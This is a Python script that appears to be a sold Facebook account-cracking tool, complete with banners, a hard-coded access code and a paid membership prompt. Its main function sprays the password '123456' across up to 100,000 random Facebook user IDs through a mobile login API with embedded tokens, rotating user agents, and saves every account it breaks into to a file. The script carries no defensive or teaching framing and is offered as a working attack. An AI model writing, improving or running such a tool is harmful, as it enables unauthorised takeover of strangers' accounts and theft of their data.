
import os,sys,time,random
import requests,json
from datetime import datetime as d
from termcolor import colored
from hashlib import md5 as md
import platform as p

lal='\033[1;31;40m'
sobuj='\033[1;32;40m'
nil='\033[1;34;40m'
holud='\033[1;33;40m'
e='\033[1;0m'
def banner():
	os.system("clear")
	b=colored("""
  █████▒▄▄▄       ▄████▄  ▓█████  ▄▄▄▄    ▒█████   ▒█████   ██ ▄█▀
▓██   ▒▒████▄    ▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒███   ▒██▒ ▄██▒██░  ██▒▒██░  ██▒▓███▄░ 
░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██   ██░▓██ █▄ 
░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
 ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
 ░       ▒   ▒▒ ░  ░  ▒    ░ ░  ░▒░▒   ░   ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
 ░ ░     ░   ▒   ░           ░    ░    ░ ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
             ░  ░░ ░         ░  ░ ░          ░ ░      ░ ░  ░  ░   
                 ░                     ░                          
______Author___ : Md Josif Khan
_____Coded By__ : Md Josif Khan
____GitHub_____ : Md Josif Khan
___YouTube_____ : Md Josif Khan
__Facebook_____ : Md Josif Khan
____________________________________________________________________

""","red")
	print(b)



# //________________________///
# ACCESS CODE SYSTEM
def access_code():
	os.system('clear')
	print(colored("""
          ▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▓█   ▀ ▒██    ▒ ▒██    ▒ 
          ▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒███   ░ ▓██▄   ░ ▓██▄   
          ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒▓█  ▄   ▒   ██▒  ▒   ██▒
           ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░▒████▒▒██████▒▒▒██████▒▒
           ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
            ▒   ▒▒ ░  ░  ▒     ░  ▒    ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░
            ░   ▒   ░        ░           ░   ░  ░  ░  ░  ░  ░  
                ░  ░░ ░      ░ ░         ░  ░      ░        ░  
                ░        ░                                 
		""","green"))

	ac=input(f"[+] {lal}Your access code please{e}>>{sobuj}")
	key='my name is josif'
	if key==ac:
		# print("")
		print(f"{e}[+] {sobuj}access granted, you can use now!!{nil}:){e}")
		time.sleep(2)
		function()
	else:
		print(f"{e}[+] {lal}Sorry access denied, you cannot use it! {nil}:({e}")
		time.sleep(2)
		sys.exit('bye!')
# //______________________////////

#///______________________________//////
# MEMBERSHIP SYSTEM
def members():
	os.system('clear')
	banner()
	key=md(str(p.uname()).encode()).hexdigest()
	try:
		member='' #str(requests.get('https://raw.githubusercontent.com/josifkhan/memberships/main/members.txt').text)
		if key in member:
			print('Welcome back :)')
			time.sleep(1)
			access_code()
		else:
			print(f"""
		         {lal}Select Membership{e}
		    ____________________________
		    [01] {sobuj}Buy Monthly{e} [{sobuj}400TK{e}]
		    [00] {lal}Exit now{e}
		    ____________________________
		    """)
			
			op=input(f'{lal}option{e}>>')
			if op=='01' or op=='1':
				print(f"""
		    [+] {lal}Your Account Key{e} : [ {sobuj}{key}{e} ]
		    [-] {lal}Send your key to me at {holud}fb/josifvai{e}. or call {sobuj}01946176869{e}""")
			else:
				print("Bye bye!")
	except requests.exceptions.ConnectionError:
		print(f"{lal}[!] Internet Connection Lost!{e}")
		sys.exit()
	except KeyboardInterrupt:
		print("[+] cancelled!")
		sys.exit()
#///_______________________________/////

def status():
	print(f"""
      ______________________________________________________
                 {holud}Running program{e}>>Exit>>{lal}ctrl+z{e}<<
                    ________________________
    """)

useragent=['Mozilla/5.0 (Linux; Android 8.1.0; V1818A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; arm_64; Android 8.1.0; CPH1903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.111.1 YaSearchBrowser/21.111.1 BroPP/1.0 SA/3 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; LM-Q710(FGN) Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 GoogleApp/12.44.23.23.arm',"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.0.1"]
password="123456"

def function():
	banner()
	status()
	for _ in range(100000): # range barai dile scaning limit barbe
		ua=random.choice(useragent)
		try:

			uid = random.randint(100000010000000,100000099999999) #2009 ID Serial Number
			uid=str(uid)

			headers={'user-agent': ua}
			
			url='https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
			view=requests.get(url, headers=headers)
			result=json.loads(view.text)
			
			if "The phone" in str(result)or "The username" in str(result) or "The password" in str(result):
				print(colored(f"[{_}] {uid} != {password}","red"),'[Incorrect]')
				pass
			
			elif "Invalid username or password (401)" in str(result):
				#print(colored("Ip blocked,Turn off data connection or on airplane mode, to unblock your ip","yellow"))
				pass

			elif "www.facebook.com" in str(result):
				print(colored(f"[{_}] {uid} == {password} [Logged In]","green"))
				open('LOGGEDIN.txt','a').write(f'{uid} == {password}\n') # mader login howa account er details memory te save korte ei line er code kaj korbe
			else:
				print(result)
				pass


		except requests.exceptions.ConnectionError:
			print("No Internet")
			sys.exit()
		except KeyboardInterrupt:
			print("cancelled")
			sys.exit()
members()

# abar update hote ektu somoi lagbe eto khon onno kaj kori


